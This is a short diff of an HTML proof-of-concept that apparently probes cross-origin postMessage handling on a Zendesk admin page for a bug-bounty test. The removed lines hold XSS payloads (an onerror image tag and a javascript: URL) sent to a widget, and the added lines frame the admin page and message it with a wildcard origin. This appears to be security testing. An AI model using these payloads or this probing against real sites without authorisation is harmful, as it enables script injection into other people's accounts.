@@ -1,13 +1,13 @@
 <script>
-window.postMessage({
-  type: 'SHOW_Z2_WIDGET_MESSAGE_TYPE',
-  params: {
-    options: {
-      widgetInput1: '<img src=x onerror=console.log("XSS")>',
-      widgetInput2: 'javascript:alert(1)',
-      specificIntent: 'test',
-      inProduct: true
-    }
-  }
-}, '*');
+window.addEventListener('message', (e) => {
+    console.log('Origin:', e.origin);
+    console.log('Data:', e.data);
+});
+
+  
+</script>
+<iframe id="target" src="https://hackerone-43772.zendesk.com/admin/home"></iframe>
+<script>
+  const frame = document.getElementById('target').contentWindow;
+  frame.postMessage({ action: 'doSomething', data: 'test' }, '*');
 </script>
